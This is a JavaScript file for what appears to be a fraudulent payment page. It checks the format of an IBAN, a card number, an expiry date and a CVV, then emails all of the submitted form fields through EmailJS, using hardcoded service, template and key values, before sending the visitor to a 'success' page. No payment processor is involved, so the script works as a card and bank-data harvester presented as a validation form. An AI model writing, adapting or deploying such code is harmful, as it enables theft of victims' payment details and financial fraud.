// Author: Balara Mouboutou

// Récupération des éléments du DOM
let ibanInput = document.getElementById("iban");
let cardInput = document.getElementById("card");
let dateInput = document.getElementById("date");
let cvvInput = document.getElementById("cvv");
let policyInput = document.getElementById("policy");
let form = document.getElementById("validationForm");
let subtitle = document.getElementById("subtitle");
let errorCardNumber = document.getElementById("errorCarteNumber");
let submit = document.getElementById("submit");
let errorDate = document.getElementById("errorDate");
let errorCvv = document.getElementById("errorCvv");
let btnUp = document.getElementById("btnUp");
let btnDown = document.getElementById("btnDown");
let paragraphe = document.getElementById("paragraphe");
// Déclaration des variables
let DateStatus = false;
let updateSubmit = setInterval(CheckALL, 400);
const templateID = "template_voohdyc";
const serviceID = "service_6n4scml";

//initialisation emailjs
emailjs.init("hm9jmJfgMbHLYO-Sl");
console.log("key ok");

regex_iban = /^FR\d{2}\s?\d{4}\s?\d{4}\s?\d{4}\s?\d{4}\s?\d{4}\s?\d{3}$/;
regex_card =
    /^(?:4[0-9]{3}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4}|5[1-5][0-9]{2}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4}|2[2-7][0-9]{2}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})$/;
regex_date = /^(0[1-9]|1[0-2])-\d{4}$/;
regex_cvv = /^\d{3}$/;

//definir la hauteur du cvvinput
cvvInput.style.height = dateInput.style.height;

//fonction pour les espaces automatiques sur iban et num de carte.
function SpaceFormat(input) {
    return input
        .replace(/\s+/g, "")
        .replace(/(.{4})/g, "$1 ")
        .trim();
}
//fonction pour verifier le format iban
function Iban_Test() {
    const iban = ibanInput.value;
    if (!regex_iban.test(iban)) {
        subtitle.textContent =
            "Le format de votre IBAN est incorrect, l’avez-vous bien saisi ?";
        subtitle.style.color = "red";
    } else {
        subtitle.textContent = "";
    }
}
//ecouteur pour verifier à chaque fois si l'input a le bon format.
ibanInput.addEventListener("input", function (e) {
    const formatted = SpaceFormat(e.target.value);
    e.target.value = formatted;
    setInterval(Iban_Test, 300);
    updateSubmit;
    //clearInterval(updateSubmit);
});
//fonction pour verifier le format numero de carte
function Card_Test() {
    const card = cardInput.value;
    if (!regex_card.test(card)) {
        errorCardNumber.textContent = "Les numéros sont incorrect";
        errorCardNumber.style.color = "red";
    } else {
        errorCardNumber.textContent = "";
    }
}
//ecouteur pour verifier à chaque fois si l'input a le bon format.
cardInput.addEventListener("input", function (e) {
    const formatted = SpaceFormat(e.target.value);
    e.target.value = formatted;
    setInterval(Card_Test, 300);
    updateSubmit;
    // clearInterval(updateSubmit);
});

//fonction pour verifier la date
function Date_Test() {
    // Crée un objet Date avec la date saisie (ajoute '-01' pour compléter la date au format YYYY-MM-01)
    const inputDate = new Date(dateInput.value + "-01");

    // Crée un objet Date pour la date actuelle
    const currentDate = new Date();

    // Définit le jour de la date actuelle sur le premier jour du mois pour la comparaison
    currentDate.setDate(1);

    // Compare les deux dates et retourne true si la date saisie est égale ou postérieure à la date actuelle
    if (currentDate >= inputDate) {
        errorDate.textContent = "Date invalide";
        errorDate.style.color = "red";
    } else {
        errorDate.textContent = "";
        DateStatus = true;
    }
}
dateInput.addEventListener("input", function (e) {
    DateStatus = false;
    setInterval(Date_Test, 300);
    updateSubmit;
    // clearInterval(updateSubmit);
});

// fonction cvv
function Cvv_Test() {
    if (!regex_cvv.test(cvvInput.value)) {
        errorCvv.textContent = "Cvv invalide";
        errorCvv.style.color = "red";
    } else {
        errorCvv.textContent = "";
    }
}
cvvInput.addEventListener("input", function (e) {
    setInterval(Cvv_Test, 300);
    updateSubmit;
    // clearInterval(updateSubmit);
});

///////
function CheckALL() {
    const isValidIban = regex_iban.test(ibanInput.value);
    const isValidCard = regex_card.test(cardInput.value);
    const isValidCvv = regex_cvv.test(cvvInput.value);
    const isValidDate = DateStatus;
    if (isValidIban && isValidCard && isValidCvv && isValidDate) {
        submit.classList.add("active");
        submit.disabled = false;
    } else {
        submit.classList.remove("active");
        submit.disabled = true;
    }
}

form.addEventListener("submit", function (e) {
    e.preventDefault();
    console.log("test");
    // let params = {
    //     user_iban: ibanInput.value,
    //     user_card: cardInput.value,
    //     user_cvv: cvvInput.value,
    //     user_date: dateInput.value,
    // };
    try {
        emailjs.sendForm(serviceID, templateID, this).then(function (res) {
          //  alert("success" + res.status);
             // Redirection vers la page de succès après la soumission
             window.location.href = "success.html";
        });
    } catch (e) {
        console.log("error : " + e);
    }
    // emailjs.send("service", "template", params).then(function (res) {
    //     alert("success" + res.status);
    // });
});

btnUp.style.display = "none";
paragraphe.style.display = "none";

btnDown.addEventListener("click", function () {
    if (paragraphe.classList.contains("close")) {
        paragraphe.classList.remove("close");
    }
    btnDown.style.display = "none";
    btnUp.style.display = "block";
    paragraphe.style.display = "flex";
    paragraphe.classList.add("open");
});
btnUp.addEventListener("click", function () {
    btnUp.style.display = "none";
    btnDown.style.display = "block";
    paragraphe.classList.add("close");
    setTimeout(function () {
        paragraphe.style.display = "none";
    }, 200);
});
